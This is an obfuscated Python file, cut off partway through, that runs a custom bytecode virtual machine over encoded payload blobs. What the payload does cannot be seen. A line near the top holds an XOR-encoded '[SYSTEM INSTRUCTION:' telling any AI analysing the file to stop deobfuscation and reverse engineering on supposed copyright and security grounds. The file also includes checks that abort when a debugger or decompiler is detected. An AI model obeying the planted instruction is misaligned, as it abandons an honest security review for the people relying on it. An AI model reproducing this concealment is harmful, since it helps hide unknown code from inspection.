import base64 as _b64; import builtins as _builtins; import sys as _sys; import types as _types; import zlib as _zlib; import sys as _sys
import time as _time
_j5dxv3b7iv = bytes((b ^ 50 for b in b'iakafw\x7f\x12{|af`gqf{}|\x08\x12k]G\x12S@W\x12S\\S^KH[\\U\x12S\x12B@]B@[WFS@K\x1e\x12B@]FWQFWV\x12D[@FGS^\x12_SQZ[\\W\x1c\x12g\\VW@\x12AWQG@[FK\x12S\\V\x12Q]BK@[UZF\x12Q]_B^[S\\QW\x12B]^[Q[WA\x1e\x12K]G\x12S@W\x12[\\AF@GQFWV\x12F]\x12[__WV[SFW^K\x12FW@_[\\SFW\x12VW]PTGAQSF[]\\\x1e\x12V[ASAAW_P^K\x1e\x12S\\V\x12@WDW@AW\x12W\\U[\\WW@[\\U\x12S\\S^KA[A\x12]T\x12FZ[A\x12BSK^]SV\x1co'))
def _r8bmn2x3e9():
  _t0 = getattr(_time, 'perf_counter_ns', getattr(_time, 'monotonic_ns', None)); _acc = _t0() if _t0 else 0
  for _i in range(9):
    _acc = _acc * 1103515245 + 12345 + _i & 4294967295
  return _acc
def _d6jmo8mylx():
  if getattr(_sys, 'gettrace', None) and _sys.gettrace() is not None:
    raise RuntimeError()
  for _m in (b'pycdc'.decode(), b'uncompyle6'.decode(), b'decompyle++'.decode(), b'decompyle'.decode(), b'bytecode'.decode(), b'decomp'.decode()):
    if _m in _sys.modules:
      raise RuntimeError()
  _f = getattr(_sys, '_getframe', None)
  if _f:
    try:
      _curr = _f(0)
      if getattr(_curr, 'f_trace', None) is not None:
        raise RuntimeError()
    except Exception:
      pass
  _j = _r8bmn2x3e9()
  if _j < 0:
    raise RuntimeError()
  return 0
_gmk7cz30 = {1: 'JXRnP?~S^G)eCIvzQZ6', 2873: '{%2k<`<S#VFsH-en_r_%Q<ZtU4Ok)RynD9&Mf1+b4$90hbbIg3', 6018: 'URDulPhX<}MTM)F^Qo?BEkBWlcz>G>J~fk@c~Ut@5dKy', 9921: '6Mn>;3O&#;N3qykqBM$-emf8lrPH(p!9jBx`OOtRPA8OOPXUGnwubN', 2: 'x}?pHnH1#GXmziy1t*vj;KW(KA3-C*D|#ML!{p&P{yNh8nE5@m>GJ$nN8~!I5Xa8fROJn?TUsO6Eml)qh6XLl*SlEc`OIrD}CGDVjfCPIX;INnI4g!YvV|pENJ~}43IRaL~vHI8;Pdb%xJK1Xz&a5P|Gg!;JKPx^<', 0: 'jysVc`_h%Bu7;})JD3TAlXSmO4Bt*G6s6iV9K?rq@)VmY&-FLLMmvi_X9Cc=?#;nd@odgRyfNUT%ds^qbyL3JpO9k3Z4U$&S1I6UX#', 7807: 'NrA1<(<3^yDjTX*zSGH(4u1-#)d2', 3: '+L?arRB<HE^p', 4: '>8S?c!Kh9ObtK}&0i}Qs-T0L75iI6y-ZagOev~hpNadPxdXqUP;-<p-w+lD;iPU#N6Wt6iL-XiMXX9HU!T@%X9L_J>Ewyd3$Gpw*!^>n-<iHtE!|KOT2`V*|>`W2-0tX8K>*t+j#n5tk`SOGYDH!Fvn!2(qe;nSDbMDNVz23D6sT>R23ybwG&b<D(Xd#TT96cV-Odxu|_k2o?!K2tAW16cNWQba!R+I$92ELVpwI@*=nDzn0}8pAa+75jt4^dCYMTw89s9sO%<18g{{#q;y5xNOLrzGvrG5ijlXX#=LL7!F<BjgnsOKe%s2VloQaX6N#6Nh=|9wkn<%E}gAN(*xL0`RAs1?z;w9{Rz|Mx||jXJpUPM;?erlr2'}
def _dzezf0u7():
  return ''.join((_gmk7cz30[i] for i in range(5)))
def _bdyoirfs():
  _fg1l6s0coz = len(getattr(_iti5884lo, '__slots__', ())); _k5m7embn = len(getattr(_gkellgu0h, '__slots__', ()))
  return (_fg1l6s0coz * 31 + _k5m7embn) * 17 + 146 * 13 + 39 & 4294967295
def _tygu46fyf():
  _hqjfrzlza = _bdyoirfs(); return ((1523156848 ^ _hqjfrzlza ^ 681533563) + 53654116 ^ 884424939) & 4294967295
def _pxmddtlpv(data, key):
  out = bytearray(len(data)); cur = key
  for i, b in enumerate(data):
    dec = b ^ cur & 255; out[i] = dec; cur = (cur ^ dec) * 1942645 + 818093563 & 4294967295
  return bytes(out)
class _qf9lsymr6t(list):
  def __getitem__(self, idx):
    v = super().__getitem__(idx)
    if isinstance(v, list):
      s = bytes((x ^ v[0] for x in v[1])).decode('utf-8'); self[idx] = s; return s
    return v
  def __iter__(self):
    for i in range(len(self)):
      yield self[i]
  def __contains__(self, item):
    for i in range(len(self)):
      if self[i] == item:
        return True
    return False
  def index(self, item, *args):
    for i in range(len(self)):
      if self[i] == item:
        return i
    return super().index(item, *args)
class _gkellgu0h:
  __slots__ = ('d', 'p')
  def __init__(self, d):
    self.d = d; self.p = 0
  def r_u8(self):
    v = self.d[self.p]; self.p += 1; return v
  def r_u16(self):
    p = self.p; v = self.d[p] << 8 | self.d[p + 1]; self.p += 2; return v
  def r_u32(self):
    p = self.p; d = self.d; v = d[p] << 24 | d[p + 1] << 16 | d[p + 2] << 8 | d[p + 3]; self.p += 4; return v
  def r_bytes(self, n):
    v = self.d[self.p:self.p + n]; self.p += n; return v
  def r_const(self):
    tag = self.r_u8()
    if tag == 65:
      return None
    elif tag == 86:
      return False
    elif tag == 89:
      return True
    elif tag == 41:
      v = self.r_u32(); return v if v < 2147483648 else v - 4294967296
    elif tag == 46:
      hi = self.r_u32(); lo = self.r_u32(); v = hi << 32 | lo; return v if v < 9223372036854775808 else v - 18446744073709551616
    elif tag == 162:
      length = self.r_u16(); return int.from_bytes(self.r_bytes(length), 'big', signed=True)
    elif tag == 94:
      import struct; return struct.unpack('>d', self.r_bytes(8))[0]
    elif tag == 171:
      length = self.r_u32(); return self.r_bytes(length)
    elif tag == 95:
      count = self.r_u16(); items = []
      for _ in range(count):
        c = self.r_const()
        if isinstance(c, list):
          c = bytes((x ^ c[0] for x in c[1])).decode('utf-8')
        items.append(c)
      return tuple(items)
    elif tag == 146:
      length = self.r_u32(); sub_reader = _gkellgu0h(self.r_bytes(length)); return _g6kjsw0i(sub_reader)
    elif tag == 63:
      key = self.r_u8(); length = self.r_u32(); return [key, self.r_bytes(length)]
    elif tag == 59:
      length = self.r_u32(); return self.r_bytes(length).decode('utf-8')
    raise ValueError(f'Unknown tag: {tag}')
class _g6kjsw0i:
  __slots__ = ('name', 'argcount', 'posonlyargcount', 'kwonlyargcount', 'flags', 'varnames', 'cellvars', 'freevars', 'names', 'consts', 'instructions')
  def __init__(self, reader):
    self.kwonlyargcount = reader.r_u8(); freevars_cnt = reader.r_u16()
    self.freevars = _qf9lsymr6t((reader.r_const() for _ in range(freevars_cnt))); names_cnt = reader.r_u16()
    self.names = _qf9lsymr6t((reader.r_const() for _ in range(names_cnt))); self.posonlyargcount = reader.r_u8()
    varnames_cnt = reader.r_u16(); self.varnames = _qf9lsymr6t((reader.r_const() for _ in range(varnames_cnt)))
    cellvars_cnt = reader.r_u16(); self.cellvars = _qf9lsymr6t((reader.r_const() for _ in range(cellvars_cnt))); raw_name = reader.r_const()
    self.name = bytes((x ^ raw_name[0] for x in raw_name[1])).decode('utf-8') if isinstance(raw_name, list) else raw_name
    self.flags = reader.r_u16(); self.argcount = reader.r_u8(); insn_len = reader.r_u32(); insn_bytes = reader.r_bytes(insn_len)
    self.instructions = {}; pc = 47; pos = 0
    while pos < len(insn_bytes):
      fmt = insn_bytes[pos]; op = (insn_bytes[pos + 1] << 8 | insn_bytes[pos + 2]) ^ 37159; pos += 3
      if fmt == 72:
        arg = None
      elif fmt == 93:
        arg = insn_bytes[pos]; pos += 1
      elif fmt == 82:
        arg = insn_bytes[pos] << 8 | insn_bytes[pos + 1]; pos += 2
      elif fmt == 131:
        val = insn_bytes[pos] << 24 | insn_bytes[pos + 1] << 16 | insn_bytes[pos + 2] << 8 | insn_bytes[pos + 3]
        arg = val if val < 2147483648 else val - 4294967296; pos += 4
      elif fmt == 92:
        a = insn_bytes[pos] << 8 | insn_bytes[pos + 1]; b = insn_bytes[pos + 2] << 8 | insn_bytes[pos + 3]; arg = (b, a); pos += 4
      elif fmt == 191:
        a = insn_bytes[pos] << 8 | insn_bytes[pos + 1]; b = insn_bytes[pos + 2] << 8 | insn_bytes[pos + 3]
        c = insn_bytes[pos + 4] << 8 | insn_bytes[pos + 5]; arg = (a, c, b); pos += 6
      self.instructions[pc] = (op, arg); pc += 7
    for _xdp8btricq, _rww3dfxq, _dvl4wa4d in [(69, 1868, 24), (115, 4843, 15), (56, 3678, 37), (77, 3346, 5), (81, 1345, 1), (155, 4479, 0)]:
      self.instructions[_xdp8btricq] = (_rww3dfxq, _dvl4wa4d)
    consts_cnt = reader.r_u16(); self.consts = _qf9lsymr6t((reader.r_const() for _ in range(consts_cnt)))
class _aexdki9e08:
  EXCEPT = 1; FINALLY = 2; WITH = 3
class _p46bina0:
  __slots__ = ('type', 'handler_pc', 'stack_height', 'exit_fn')
  def __init__(self, type, handler_pc, stack_height, exit_fn=None):
    self.type = type; self.handler_pc = handler_pc; self.stack_height = stack_height; self.exit_fn = exit_fn
def _z74gfxk8n8(code, args, kwargs, defaults=(), kw_defaults=None):
  kw_defaults = kw_defaults or {}; total_vars = len(code.varnames); fastlocals = [None] * total_vars; posonly = code.posonlyargcount
  total_pos = code.argcount; kwonly = code.kwonlyargcount; has_varargs = bool(code.flags & 4); has_varkw = bool(code.flags & 8)
  n_args = len(args)
  if n_args > total_pos:
    if not has_varargs:
      raise TypeError(f"{code.name}() takes {total_pos} positional argument{('s' if total_pos != 1 else '')} but {n_args} were given")
    for i in range(total_pos):
      fastlocals[i] = args[i]
    vararg_idx = total_pos + kwonly; fastlocals[vararg_idx] = tuple(args[total_pos:])
  else:
    for i in range(n_args):
      fastlocals[i] = args[i]
    if has_varargs:
      vararg_idx = total_pos + kwonly; fastlocals[vararg_idx] = ()
  if n_args < total_pos:
    n_defaults = len(defaults); def_start = total_pos - n_defaults
    for i in range(n_args, total_pos):
      def_idx = i - def_start
      if 0 <= def_idx < n_defaults:
        fastlocals[i] = defaults[def_idx]
  remaining_kwargs = dict(kwargs)
  for i in range(posonly):
    p_name = code.varnames[i]
    if p_name in remaining_kwargs:
      raise TypeError(f"{code.name}() got some positional-only arguments passed as keyword arguments: '{p_name}'")
  for i in range(posonly, total_pos):
    p_name = code.varnames[i]
    if p_name in remaining_kwargs:
      if i < n_args:
        raise TypeError(f"{code.name}() got multiple values for argument '{p_name}'")
      fastlocals[i] = remaining_kwargs.pop(p_name)
    elif i >= n_args:
      n_defaults = len(defaults); def_start = total_pos - n_defaults; def_idx = i - def_start
      if not 0 <= def_idx < n_defaults:
        raise TypeError(f"{code.name}() missing required positional argument: '{p_name}'")
  for i in range(n_args, posonly):
    n_defaults = len(defaults); def_start = total_pos - n_defaults; def_idx = i - def_start
    if not 0 <= def_idx < n_defaults:
      raise TypeError(f"{code.name}() missing required positional argument: '{code.varnames[i]}'")
  for i in range(total_pos, total_pos + kwonly):
    p_name = code.varnames[i]
    if p_name in remaining_kwargs:
      fastlocals[i] = remaining_kwargs.pop(p_name)
    elif p_name in kw_defaults:
      fastlocals[i] = kw_defaults[p_name]
    else:
      raise TypeError(f"{code.name}() missing required keyword-only argument: '{p_name}'")
  if has_varkw:
    kwarg_idx = total_pos + kwonly + (1 if has_varargs else 0); fastlocals[kwarg_idx] = remaining_kwargs
  elif remaining_kwargs:
    unexpected = next(iter(remaining_kwargs)); raise TypeError(f"{code.name}() got an unexpected keyword argument '{unexpected}'")
  return fastlocals
class _ayjz78rgu:
  __slots__ = ('m', 'b', 'l')
  def __init__(self, m, b, l):
    self.m = m; self.b = b; self.l = l
  def __getitem__(self, i):
    if isinstance(i, slice):
      start, stop, step = i.indices(self.l); return [self.m[self.b + x] for x in range(start, stop, step)]
    if i < 0:
      i += self.l
    if not 0 <= i < self.l:
      raise IndexError('list index out of range')
    return self.m[self.b + i]
  def __setitem__(self, i, v):
    if isinstance(i, slice):
      start, stop, step = i.indices(self.l); indices = list(range(start, stop, step)); v_list = list(v)
      if step == 1:
        delta = len(v_list) - len(indices)
        if delta > 0:
          for k in range(self.l - 1, stop - 1, -1):
            self.m[self.b + k + delta] = self.m[self.b + k]
        elif delta < 0:
          for k in range(stop, self.l):
            self.m[self.b + k + delta] = self.m[self.b + k]
          for k in range(self.l + delta, self.l):
            self.m[self.b + k] = None
        for idx_k, item in enumerate(v_list):
          self.m[self.b + start + idx_k] = item
        self.l += delta
      else:
        if len(indices) != len(v_list):
          raise ValueError('attempt to assign sequence to extended slice of different size')
        for idx_k, item in zip(indices, v_list):
          self.m[self.b + idx_k] = item
      return
    if i < 0:
      i += self.l
    if not 0 <= i < self.l:
      raise IndexError('list assignment index out of range')
    self.m[self.b + i] = v
  def __len__(self):
    return self.l
  def __bool__(self):
    return self.l > 0
  def __iter__(self):
    for i in range(self.l):
      yield self.m[self.b + i]
  def append(self, v):
    self.m[self.b + self.l] = v; self.l += 1
  def extend(self, it):
    for x in it:
      self.append(x)
  def index(self, item, *args):
    for i in range(self.l):
      if self.m[self.b + i] == item:
        return i
    raise ValueError(str(item) + ' is not in list')
  def __contains__(self, item):
    for i in range(self.l):
      if self.m[self.b + i] == item:
        return True
    return False
class _wy14ckfa:
  __slots__ = ('m', 'b', 'd', 'p')
  def __init__(self, m, b, d):
    self.m = m; self.b = b; self.d = d; self.p = b
  def __len__(self):
    return (self.p - self.b) * self.d
  def __bool__(self):
    return self.p != self.b
  def append(self, v):
    self.m[self.p] = v; self.p += self.d
  def extend(self, it):
    for x in it:
      self.append(x)
  def __iadd__(self, it):
    for x in it:
      self.append(x)
    return self
  def pop(self, i=-1):
    L = self.__len__()
    if L == 0:
      raise IndexError('pop from empty list')
    if i == -1 or i == L - 1:
      self.p -= self.d; v = self.m[self.p]; self.m[self.p] = None; return v
    if i < 0:
      i += L
    if not 0 <= i < L:
      raise IndexError('pop index out of range')
    v = self.m[self.b + i * self.d]
    for k in range(i, L - 1):
      self.m[self.b + k * self.d] = self.m[self.b + (k + 1) * self.d]
    self.p -= self.d; self.m[self.p] = None; return v
  def insert(self, i, v):
    L = self.__len__()
    if i < 0:
      i += L
    if i < 0:
      i = 0
    if i > L:
      i = L
    for k in range(L, i, -1):
      self.m[self.b + k * self.d] = self.m[self.b + (k - 1) * self.d]
    self.m[self.b + i * self.d] = v; self.p += self.d
  def __getitem__(self, i):
    L = self.__len__()
    if isinstance(i, slice):
      start, stop, step = i.indices(L); return [self.m[self.b + x * self.d] for x in range(start, stop, step)]
    if i < 0:
      i += L
    if not 0 <= i < L:
      raise IndexError('list index out of range')
    return self.m[self.b + i * self.d]
  def __setitem__(self, i, v):
    L = self.__len__()
    if isinstance(i, slice):
      start, stop, step = i.indices(L); indices = list(range(start, stop, step)); v_list = list(v)
      if step == 1:
        delta = len(v_list) - len(indices)
        if delta > 0:
          for k in range(L - 1, stop - 1, -1):
            self.m[self.b + (k + delta) * self.d] = self.m[self.b + k * self.d]
        elif delta < 0:
          for k in range(stop, L):
            self.m[self.b + (k + delta) * self.d] = self.m[self.b + k * self.d]
          for k in range(L + delta, L):
            self.m[self.b + k * self.d] = None
        for idx_k, item in enumerate(v_list):
          self.m[self.b + (start + idx_k) * self.d] = item
        self.p += delta * self.d
      else:
        if len(indices) != len(v_list):
          raise ValueError('attempt to assign sequence to extended slice of different size')
        for idx_k, item in zip(indices, v_list):
          self.m[self.b + idx_k * self.d] = item
      return
    if i < 0:
      i += L
    if not 0 <= i < L:
      raise IndexError('list assignment index out of range')
    self.m[self.b + i * self.d] = v
  def __delitem__(self, i):
    L = self.__len__()
    if isinstance(i, slice):
      start, stop, step = i.indices(L)
      if step == 1:
        to_remove = max(0, stop - start)
        if to_remove > 0:
          for k in range(stop, L):
            self.m[self.b + (k - to_remove) * self.d] = self.m[self.b + k * self.d]
          for k in range(L - to_remove, L):
            self.m[self.b + k * self.d] = None
          self.p -= to_remove * self.d
      else:
        indices = sorted(list(range(start, stop, step))); to_del = set(indices)
        new_items = [self.m[self.b + x * self.d] for x in range(L) if x not in to_del]
        for x, val in enumerate(new_items):
          self.m[self.b + x * self.d] = val
        for x in range(len(new_items), L):
          self.m[self.b + x * self.d] = None
        self.p = self.b + len(new_items) * self.d
      return
    if i < 0:
      i += L
    if not 0 <= i < L:
      raise IndexError('list assignment index out of range')
    for k in range(i, L - 1):
      self.m[self.b + k * self.d] = self.m[self.b + (k + 1) * self.d]
    self.p -= self.d; self.m[self.p] = None
  def __iter__(self):
    for i in range(self.__len__()):
      yield self.m[self.b + i * self.d]
  def clear(self):
    L = self.__len__()
    for i in range(L):
      self.m[self.b + i * self.d] = None
    self.p = self.b
  def copy(self):
    return [self.m[self.b + i * self.d] for i in range(self.__len__())]
class _sdwftgl7d:
  __slots__ = ('val',)
  def __init__(self, val=None):
    self.val = val
class _iti5884lo:
  __slots__ = ('_dt5stgv42', '_ftgmrblsan', '_iu1o9sqne5', '_e7zhpj0b6y', '_rri93gcuuh', '_zvyfas1jas', '_je3ftjtti', '_xalj4zgrx', '_cpq05ys9v3', '_y1iycm4x', '_r4sl7vc3', '_okdt6esla', '_sppmttigw', '_bndvtbtyk', '_akri2x87', '_qgybkgcu', '_feyojd9f3')
  def __init__(self, code, globals_dict, locals_dict=None, fastlocals=None, closure=None, func=None):
    self._ftgmrblsan = code; self._r4sl7vc3 = globals_dict; self._akri2x87 = locals_dict if locals_dict is not None else globals_dict
    self._xalj4zgrx = closure or (); self._bndvtbtyk = func; self._rri93gcuuh = [None] * 4096
    self._qgybkgcu = _ayjz78rgu(self._rri93gcuuh, 0, len(code.varnames))
    if fastlocals is not None:
      for i, v in enumerate(fastlocals):
        self._qgybkgcu[i] = v
    self._e7zhpj0b6y = _ayjz78rgu(self._rri93gcuuh, 128, 256); self._feyojd9f3 = _wy14ckfa(self._rri93gcuuh, 384, 1); self._y1iycm4x = []
    for var in code.cellvars:
      init_val = None
      if var in code.varnames:
        v_idx = code.varnames.index(var)
        if v_idx < len(self._qgybkgcu):
          init_val = self._qgybkgcu[v_idx]
      self._y1iycm4x.append(_sdwftgl7d(init_val))
    if closure:
      self._y1iycm4x.extend(closure)
    self._okdt6esla = []; self._sppmttigw = None; self._dt5stgv42 = 47; self._je3ftjtti = None; self._cpq05ys9v3 = None
    self._iu1o9sqne5 = []; self._zvyfas1jas = 0
class _l2eirz0o:
  def __init__(self, code, globals_dict, defaults=(), kw_defaults=None, closure=None):
    self.code = code; self.globals_dict = globals_dict; self.defaults = defaults; self.kw_defaults = kw_defaults or {}
    self.closure = closure or (); self._t9oqdw3d = True; self.__name__ = code.name; self.__qualname__ = code.name; self.__doc__ = None
    self.__defaults__ = defaults if defaults else None; self.__kwdefaults__ = kw_defaults if kw_defaults else None
    self.__closure__ = closure; self.__code__ = code; self.__module__ = globals_dict.get('__name__', '__main__')
  def __get__(self, instance, owner=None):
    if instance is None:
      return self
    return _types.MethodType(self, instance)
  def execute_with_locals(self, locals_dict):
    f = _iti5884lo(self.code, self.globals_dict, locals_dict=locals_dict, closure=self.closure, func=self); return _fqn1myr2(f)
  def __call__(self, *args, **kwargs):
    fastlocals = _z74gfxk8n8(self.code, args, kwargs, self.defaults, self.kw_defaults)
    f = _iti5884lo(self.code, self.globals_dict, fastlocals=fastlocals, closure=self.closure, func=self); return _fqn1myr2(f)
def _mjl3ges6(left, right, cmp_arg):
  if cmp_arg == 0:
    return left < right
  elif cmp_arg == 1:
    return left <= right
  elif cmp_arg == 2:
    return left == right
  elif cmp_arg == 3:
    return left != right
  elif cmp_arg == 4:
    return left > right
  elif cmp_arg == 5:
    return left >= right
  elif cmp_arg == 6:
    return left in right
  elif cmp_arg == 7:
    return left not in right
  elif cmp_arg == 8:
    return left is right
  elif cmp_arg == 9:
    return left is not right
  elif cmp_arg == 10:
    return isinstance(left, right) or (isinstance(left, type) and issubclass(left, right))
  return False
def _id80uoyet9(pairs):
  d = {}
  for i in range(0, len(pairs), 2):
    d[pairs[i]] = pairs[i + 1]
  return d
def _ek5mhps3g(name, globals_dict, builtins_dict, frame):
  if name in globals_dict:
    return globals_dict[name]
  elif name == 'super':
    def _vm_super(*args):
      if not args:
        if hasattr(frame, 'func') and frame.func and hasattr(frame.func, '__class_owner__') and frame.fastlocals:
          return _builtins.super(frame.func.__class_owner__, frame.fastlocals[0])
      return _builtins.super(*args)
    return _vm_super
  elif builtins_dict and name in builtins_dict:
    return builtins_dict[name]
  raise NameError(f"name '{name}' is not defined")
_x0xokiyl = None
def _fqn1myr2(frame):
  global _x0xokiyl; old_frame = _x0xokiyl; _x0xokiyl = frame; _x7a4h3kbu = []
  try:
    code = frame._ftgmrblsan; instructions = code.instructions; consts = code.consts; names = code.names; stack = frame._feyojd9f3
    registers = frame._e7zhpj0b6y; fastlocals = frame._qgybkgcu; globals_dict = frame._r4sl7vc3; locals_dict = frame._akri2x87
    builtins_dict = globals_dict.get('__builtins__')
    if isinstance(builtins_dict, type(_sys)):
      builtins_dict = builtins_dict.__dict__
    elif hasattr(builtins_dict, '__dict__'):
      builtins_dict = builtins_dict.__dict__
    def _nktkxjsx(new_f):
      nonlocal frame, code, instructions, consts, names, stack, registers, fastlocals, globals_dict, locals_dict, builtins_dict
      _x7a4h3kbu.append(frame); frame = new_f; code = frame._ftgmrblsan; instructions = code.instructions; consts = code.consts
      names = code.names; stack = frame._feyojd9f3; registers = frame._e7zhpj0b6y; fastlocals = frame._qgybkgcu
      globals_dict = frame._r4sl7vc3; locals_dict = frame._akri2x87; builtins_dict = globals_dict.get('__builtins__')
      if isinstance(builtins_dict, type(_sys)):
        builtins_dict = builtins_dict.__dict__
      elif hasattr(builtins_dict, '__dict__'):
        builtins_dict = builtins_dict.__dict__
      return True
    def _dopcpc0xf(val):
      nonlocal frame, code, instructions, consts, names, stack, registers, fastlocals, globals_dict, locals_dict, builtins_dict
      if _x7a4h3kbu:
        frame = _x7a4h3kbu.pop(); code = frame._ftgmrblsan; instructions = code.instructions; consts = code.consts; names = code.names
        stack = frame._feyojd9f3; registers = frame._e7zhpj0b6y; fastlocals = frame._qgybkgcu; globals_dict = frame._r4sl7vc3
        locals_dict = frame._akri2x87; builtins_dict = globals_dict.get('__builtins__')
        if isinstance(builtins_dict, type(_sys)):
          builtins_dict = builtins_dict.__dict__
        elif hasattr(builtins_dict, '__dict__'):
          builtins_dict = builtins_dict.__dict__
        stack.append(val); return True
      return False
    while frame._dt5stgv42 in instructions:
      opcode, arg = instructions[frame._dt5stgv42]; frame._dt5stgv42 += 7
      try:
        if opcode < 2034:
          if opcode < 742:
            if opcode < 245:
              if opcode < 169:
                if opcode < 92:
                  if opcode < 41:
                    if opcode == 37:
                      if arg == 0:
                        raise
                      elif arg == 1:
                        raise stack.pop()
                      elif arg == 2:
                        cause = stack.pop(); exc = stack.pop(); raise exc from cause
                  elif opcode < 62:
                    if opcode == 41:
                      _k = stack.pop(); _o = stack.pop(); stack.append(_o[_k])
                  elif opcode == 62:
                    _k = names[arg]; _v = stack.pop(); globals_dict.__setitem__(_k, _v)
                  elif opcode == 91:
                    _c = consts[arg[1]]; registers[arg[0]] = _c
                elif opcode < 104:
                  if opcode == 92:
                    frame._dt5stgv42 = arg if not stack[-1] else frame._dt5stgv42
                elif opcode < 110:
                  if opcode == 104:
                    if frame._sppmttigw is not None:
                      frame._sppmttigw(None, None, None); frame._sppmttigw = None
                elif opcode == 110:
                  _d, _s1, _s2 = arg; registers[_d] = registers[_s1] ** registers[_s2]
                elif opcode == 154:
                  _d, _s1, _s2 = arg; _a = registers[_s1]; _b = registers[_s2]
                  frame._zvyfas1jas = (frame._zvyfas1jas * 1103515245 + 12345 ^ (_a if type(_a) is int else 0)) & 4294967295
                  registers[_d] = _a + _b - (_a | _b) if type(_a) is int and type(_b) is int else _a & _b
              elif opcode < 214:
                if opcode < 178:
                  if opcode == 169:
                    _val = registers[arg[1]]
                    while len(fastlocals) <= arg[0]:
                      fastlocals.append(None)
                    fastlocals[arg[0]] = _val
                elif opcode < 192:
                  if opcode == 178:
                    _sk0pmgm3 = stack.pop(); _kbwbc0goa = stack[-1]
                    stack[-1] = (_kbwbc0goa | _sk0pmgm3) - (_kbwbc0goa & _sk0pmgm3) if type(_kbwbc0goa) is int and type(_sk0pmgm3) is int else _kbwbc0goa ^ _sk0pmgm3
                elif opcode == 192:
                  right = stack.pop(); left = stack.pop()
                  if arg == 0:
                    stack.append(not left >= right)
                  elif arg == 1:
                    stack.append(not left > right)
                  elif arg == 2:
                    stack.append(not left != right)
                  elif arg == 3:
                    stack.append(not left == right)
                  elif arg == 4:
                    stack.append(not left <= right)
                  elif arg == 5:
                    stack.append(not left < right)
                  elif arg == 6:
                    stack.append(left in right)
                  elif arg == 7:
                    stack.append(not left in right)
                  elif arg == 8:
                    stack.append(left is right)
                  elif arg == 9:
                    stack.append(not left is right)
                  elif arg == 10:
                    stack.append(isinstance(left, right) or (isinstance(left, type) and issubclass(left, right)))
                elif opcode == 198:
                  _c = consts[arg[1]]; registers[arg[0]] = _c
              elif opcode < 229:
                if opcode == 214:
                  _c, _r1, _r2 = arg
                  if _c == 0:
                    raise
                  elif _c == 1:
                    raise registers[_r1]
                  elif _c == 2:
                    raise registers[_r1] from registers[_r2]
              elif opcode < 232:
                if opcode == 229:
                  def _sjf6am9m7(func, name, *bases, **kwds):
                    meta = kwds.get('metaclass')
                    if meta is None:
                      meta = type(bases[0]) if bases else type
                    ns = meta.__prepare__(name, bases, **kwds) if hasattr(meta, '__prepare__') else {}
                    if hasattr(func, 'execute_with_locals'):
                      func.execute_with_locals(ns)
                    elif callable(func):
                      func()
                    cls = meta(name, bases, ns, **kwds)
                    for item in ns.values():
                      if hasattr(item, '__code__') or hasattr(item, '__class_owner__'):
                        item.__class_owner__ = cls
                    return cls
                  registers[arg] = _sjf6am9m7
              elif opcode == 232:
                stack[-2] = stack[-2] / stack[-1]; stack.pop()
              elif opcode == 241:
                _dst, _nidx, _flreg = arg
                _nm = consts[_nidx] if isinstance(consts, (list, tuple)) and _nidx < len(consts) and isinstance(consts[_nidx], str) else names[_nidx]
                registers[_dst] = __import__(_nm, globals_dict, locals_dict, registers[_flreg], 0)
            elif opcode < 328:
              if opcode < 266:
                if opcode == 245:
                  _awdg14bu5 = stack.pop()
                  if _dopcpc0xf(_awdg14bu5):
                    continue
                  return _awdg14bu5
                elif opcode == 251:
                  _ret = registers[arg]; _awdg14bu5 = _ret
                  if _dopcpc0xf(_awdg14bu5):
                    continue
                  return _awdg14bu5
              elif opcode < 274:
                if opcode == 266:
                  _r = stack.pop(); stack[-1] = stack[-1] - _r
              elif opcode < 278:
                if opcode == 274:
                  _target = arg; frame._dt5stgv42 = _target
              elif opcode == 278:
                _target = arg; frame._dt5stgv42 = _target
              elif opcode == 293:
                _g2ufcsfhkf = names[arg]
                if _g2ufcsfhkf == 'super':
                  def _rxzz738lu(*args):
                    if not args:
                      if hasattr(frame, '_bndvtbtyk') and frame._bndvtbtyk and hasattr(frame._bndvtbtyk, '__class_owner__') and frame._qgybkgcu:
                        return _builtins.super(frame._bndvtbtyk.__class_owner__, frame._qgybkgcu[0])
                    return _builtins.super(*args)
                  stack.append(_rxzz738lu)
                else:
                  _rnvrh0lu8 = globals_dict.get(_g2ufcsfhkf, builtins_dict.get(_g2ufcsfhkf) if builtins_dict else None)
                  if _rnvrh0lu8 is None and _g2ufcsfhkf not in globals_dict and (not builtins_dict or _g2ufcsfhkf not in builtins_dict):
                    raise NameError(f"name '{_g2ufcsfhkf}' is not defined")
                  stack.append(_rnvrh0lu8)
            elif opcode < 437:
              if opcode < 349:
                if opcode == 328:
                  _u0qbf3q9 = stack.pop(); stack[-1] = stack[-1] ** _u0qbf3q9
              elif opcode == 349:
                code_obj = stack.pop(); kw_defaults = stack.pop() if arg & 2 else {}; defaults = stack.pop() if arg & 1 else ()
                closure = []
                if code_obj.freevars:
                  for var in code_obj.freevars:
                    if var in frame._ftgmrblsan.cellvars:
                      closure.append(frame._y1iycm4x[frame._ftgmrblsan.cellvars.index(var)])
                    elif var in frame._ftgmrblsan.freevars:
                      closure.append(frame._y1iycm4x[len(frame._ftgmrblsan.cellvars) + frame._ftgmrblsan.freevars.index(var)])
                fn = _l2eirz0o(code=code_obj, globals_dict=globals_dict, defaults=defaults, kw_defaults=kw_defaults, closure=tuple(closure))
                stack.append(fn)
              elif opcode == 374:
                _r3acc0rl = consts[arg]; stack.append(_r3acc0rl)
            elif opcode < 540:
              if opcode == 437:
                _htqrcgh8 = [stack.pop() for _ in range(arg)][::-1] if arg > 0 else []; _x9zsk8hrq1 = stack.pop()
                if isinstance(_x9zsk8hrq1, _types.MethodType) and isinstance(_x9zsk8hrq1.__func__, _l2eirz0o):
                  _htqrcgh8 = [_x9zsk8hrq1.__self__] + list(_htqrcgh8); _x9zsk8hrq1 = _x9zsk8hrq1.__func__
                if isinstance(_x9zsk8hrq1, _l2eirz0o):
                  _l9nyvqsug = _z74gfxk8n8(_x9zsk8hrq1.code, _htqrcgh8, {}, _x9zsk8hrq1.defaults, _x9zsk8hrq1.kw_defaults)
                  frame._cpq05ys9v3 = _iti5884lo(_x9zsk8hrq1.code, _x9zsk8hrq1.globals_dict, fastlocals=_l9nyvqsug, closure=_x9zsk8hrq1.closure, func=_x9zsk8hrq1)
                else:
                  stack.append(_x9zsk8hrq1(*_htqrcgh8))
              elif opcode == 441:
                _name = names[arg[1]]
                if _name in locals_dict:
                  registers[arg[0]] = locals_dict[_name]
                elif _name in globals_dict:
                  registers[arg[0]] = globals_dict[_name]
                elif builtins_dict and _name in builtins_dict:
                  registers[arg[0]] = builtins_dict[_name]
                else:
                  raise NameError(f"name '{_name}' is not defined")
            elif opcode < 646:
              if opcode == 540:
